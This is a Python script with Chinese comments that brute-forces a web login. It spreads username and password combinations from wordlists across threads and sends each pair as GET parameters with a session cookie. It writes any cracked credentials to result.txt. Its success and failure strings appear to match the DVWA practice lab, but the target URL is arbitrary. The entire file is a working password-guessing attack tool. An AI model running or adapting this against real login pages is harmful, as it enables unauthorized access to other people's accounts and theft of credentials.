import requests
import threading
import queue
import time
import sys
import argparse
import os

# 成功/失败标志，从浏览器页面抓取获得
SUCCESS_FLAG = "Welcome to the password protected area"
FAIL_FLAG = "Username and/or password incorrect"

class BruteForcer:
    def __init__(self, url, cookie, user, wordlist, threads):
        # 初始化暴力破解类
        self.url = url
        self.headers = {"Cookie": cookie}
        self.user = user
        self.wordlist = wordlist
        self.threads = threads
        self.q = queue.Queue()
        self.found = False

    def load_tasks(self):
        # 加载爆破任务
        try:
            # 加载密码
            pass_list = []
            with open(self.wordlist, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    p = line.strip()
                    if p:
                        pass_list.append(p)

            # 确定用户名列表
            user_list = []
            if isinstance(self.user, list):
                user_list = self.user
            else:
                user_list.append(self.user)

            # 将用户名和密码组合放入队列
            for u in user_list:
                for p in pass_list:
                    self.q.put((u, p))

            print("用户名密码组合数:", self.q.qsize())
            print("开始爆破...")

        except:
            print("文件读取失败，请检查路径")
            exit(1)

    def worker(self):
        while not self.found:
            try:
                # 使用get_nowait()捕获队列为空的异常
                user, pwd = self.q.get_nowait()
            except queue.Empty:
                break

            params = {
                "username": user,
                "password": pwd,
                "Login": "Login"
            }

            try:
                r = requests.get(
                    self.url,
                    params=params,
                    headers=self.headers,
                    timeout=5
                )

                if SUCCESS_FLAG in r.text:
                    self.found = True
                    # 发现密码
                    print("破解成功！")
                    print("user:", user)
                    print("password:", pwd)

                    # 将破解的用户名和密码存入result.txt
                    with open("result.txt", "w") as f:
                        f.write("username:" + user + "\n" + "password:" + pwd)

                    self.q.task_done()
                    break

            except:
                # 防止网络抖动终止爆破
                pass

            self.q.task_done()
            time.sleep(0.05)

    def run(self):
        self.load_tasks()

        t_list = []
        for i in range(self.threads):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            t_list.append(t)

        for t in t_list:
            t.join()

        if not self.found:
            print("破解失败！")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", required=True)
    parser.add_argument("-c", "--cookie", required=True)
    parser.add_argument("-user", "--username", default=None)
    parser.add_argument("-w", "--wordlist", required=True)
    parser.add_argument("-t", "--threads", type=int, default=5)

    args = parser.parse_args()

    final_user = None

    # 判断用户名是否需要爆破
    if args.username:
        # 如果传了参数，判断是文件还是字符串
        if os.path.isfile(args.username):
            try:
                with open(args.username, "r") as f:
                    final_user = [line.strip() for line in f if line.strip()]
            except:
                print("读取用户名字典文件失败")
                exit(1)
        else:
            final_user = args.username
    else:
        # 如果没传入用户名参数，使用默认的username.txt进行爆破
        if os.path.isfile("username.txt"):
            try:
                with open("username.txt", "r") as f:
                    final_user = [line.strip() for line in f if line.strip()]
                print("未指定用户名，已加载默认username.txt")
            except:
                print("读取默认username.txt失败")
                exit(1)
        else:
            print("未指定用户名且未找到 username.txt")
            exit(1)

    bf = BruteForcer(
        args.url,
        args.cookie,
        final_user,
        args.wordlist,
        args.threads
    )
    bf.run()

if __name__ == "__main__":
    main()